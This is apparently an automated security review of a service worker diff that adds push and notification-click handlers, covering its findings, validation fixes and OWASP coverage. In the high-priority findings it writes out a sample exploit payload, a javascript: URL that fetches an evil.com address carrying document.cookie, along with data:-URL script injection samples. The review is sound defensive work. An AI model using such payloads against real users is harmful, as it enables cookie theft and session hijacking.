## Security Review: E61-S02 — Service Worker Push and Click Handlers

**Date:** 2026-07-05
**Phases executed:** 5/8
**Diff scope:** 6 files changed, 660 insertions, 60 deletions

### Phases Executed

| Phase | Name | Triggered By | Findings |
|-------|------|-------------|----------|
| 1 | Attack Surface | Always | 3 vectors identified |
| 2 | Secrets Scan | Always | Clean (sw.ts) |
| 3 | OWASP Top 10 | Always | 4 categories checked |
| 4 | Dependencies | N/A — no package.json change | N/A |
| 5 | Auth & Access | N/A — no auth files changed | N/A |
| 6 | STRIDE | N/A — no new routes/pages | N/A |
| 7 | Configuration | N/A — no config files changed | N/A |
| 8 | Config Security | Always-on (secrets + MCP) | 1 finding (gitignored) |

### Attack Surface Changes

| Vector | File:Line | Risk |
|--------|-----------|------|
| Push payload JSON parsing → `NotificationOptions` spread | `src/sw.ts:128-144` | Payload fields injected into browser notification (actions, vibrate, etc.) |
| Notification click URL → `openWindow()` / `navigate()` / `postMessage()` | `src/sw.ts:156-190` | URL from push payload flows to tab navigation without protocol/origin validation |
| Push subscription change → `fetch('/api/push/subscriptions', POST)` | `src/sw.ts:198-221` | Subscription endpoint receives browser push subscription JSON |

### Findings

#### High Priority (should fix)

- **`src/sw.ts:186`** (confidence: 85, CS2: Client-Side Injection):
  `self.clients.openWindow(url)` with unvalidated URL from push payload. While push payloads originate from our server, `javascript:` and `data:` protocol URLs should be explicitly blocked. An attacker who compromises the push backend or VAPID keys could inject `url: "javascript:document.cookie"` or `url: "data:text/html,<script>alert(1)</script>"` — execution depends on browser implementation of `openWindow()` during notificationclick.

  **Exploit:** Push server sends payload `{"title":"Click me","url":"javascript:fetch('https://evil.com/?'+document.cookie)"}`. User clicks notification → `openWindow(javascript:...)` executes in new window context (browser-dependent).

  **Fix:** Validate URL protocol before `openWindow()` and `navigate()`:
  ```typescript
  function isSafeUrl(url: string): boolean {
    try {
      const parsed = new URL(url, self.location.origin)
      return ['https:', 'http:', 'mailto:'].includes(parsed.protocol)
    } catch {
      return false
    }
  }
  ```

  **Autofix class:** `gated_auto`

- **`src/sw.ts:136-140`** (confidence: 78, CS2: Client-Side Injection):
  `...payload` spread into `NotificationOptions` allows arbitrary Notification API properties. An attacker with push infrastructure access can inject `actions` (custom action buttons), `requireInteraction: true` (prevents auto-dismiss), `renotify: true` (spam), or `silent: true` (suppress sound).

  **Exploit:** Push server sends `{"title":"Update","actions":[{"action":"steal","title":"Claim prize"}],"requireInteraction":true}`. Notification shows misleading action buttons and never auto-dismisses.

  **Fix:** Whitelist allowed NotificationOptions fields instead of spreading entire payload:
  ```typescript
  const allowedFields: (keyof NotificationOptions)[] = ['body', 'icon', 'badge', 'tag', 'vibrate']
  for (const key of allowedFields) {
    if (key in payload) {
      ;(notificationOptions as any)[key] = payload[key]
    }
  }
  ```

  **Autofix class:** `gated_auto`

#### Medium (fix when possible)

- **`src/sw.ts:158`** (confidence: 72):
  `const url = event.notification.data?.url || '/'` — URL consumed without validation. Should verify it's a relative path or same-origin absolute URL before use in navigation.

  **Fix:** Validate URL is relative or same-origin:
  ```typescript
  function isValidAppUrl(raw: string): boolean {
    if (raw.startsWith('/')) return true
    try {
      const u = new URL(raw)
      return u.origin === self.location.origin
    } catch { return false }
  }
  ```

  **Autofix class:** `safe_auto`

- **`src/sw.ts:169`** (confidence: 65):
  `clientUrl.pathname !== url` comparison is fragile. If `url` is `/courses` and `clientUrl.pathname` is `/courses/`, they won't match, causing unnecessary navigation. Normalize both sides with `new URL(url, self.location.origin).pathname`.

  **Autofix class:** `safe_auto`

- **`.mcp.json:12`** (confidence: 60, always-on secrets check):
  Google API key `X-Goog-Api-Key` in plaintext. File is gitignored and not tracked — not committed. Still, plaintext API keys on disk are a risk.

  **Fix:** Use env var: `"X-Goog-Api-Key": "${STITCH_GOOGLE_API_KEY}"` with value in `.env.local`.

  **Autofix class:** `advisory`

#### Informational (awareness only)

- **`src/sw.ts:177`** (CS9: Client-Side Communication):
  `client.postMessage({ type: 'NAVIGATE', url })` sends raw URL to app. Currently safe (no handler exists). If a NAVIGATE handler is added in later stories, it MUST validate the URL before navigation. Add a warning comment.

### Secrets Scan

**sw.ts**: Clean — no secrets detected. VAPID keys referenced via browser API, never hardcoded.
**.claude/hooks/**: Clean — no secrets.
**.claude/settings.json**: Clean — no secrets.
**.env files**: Not tracked by git.

### OWASP Coverage

| Category | Applicable? | Finding? | Details |
|----------|------------|----------|---------|
| CS1: Broken Client-Side Access Control | No | — | No route guards in this diff |
| CS2: Client-Side Injection (XSS) | **Yes** | **Yes** | `openWindow(url)` + `...payload` spread — no protocol/field validation |
| CS3: Sensitive Data in Client Storage | No | — | Push subscriptions stored by browser |
| CS5: Client-Side Integrity | No | — | No IndexedDB/Zustand changes |
| CS7: Client-Side Security Logging | No | — | No secrets in error logs |
| CS9: Client-Side Communication | Yes | INFO | `postMessage({NAVIGATE, url})` — safe now, future risk |
| A05: Security Misconfiguration | No | — | No config files changed |
| A06: Vulnerable Components | N/A | — | No dependency changes |
| A07: Auth Failures | No | — | No auth code changed |

### What's Done Well

1. **Proper push → notification guarantee**: Every push event calls `showNotification()`, preventing browser push permission revocation. Try/catch with fallback to defaults is well-structured.
2. **Graceful degradation in pushsubscriptionchange**: Failure is logged but not thrown — subscription loss is recoverable on next app visit.
3. **Correct use of `event.waitUntil()`**: All three handlers properly wrap async work, ensuring the service worker stays alive until operations complete.
4. **Intentional fallback chain**: Chromium `navigate()` → `postMessage` fallback for Firefox/Safari → `openWindow()` last resort. Cross-browser compatible.

---
Phases: 5/8 | Findings: 6 total | Blockers: 0 | High: 2 | Medium: 3 | Info: 1 | False positives filtered: 0
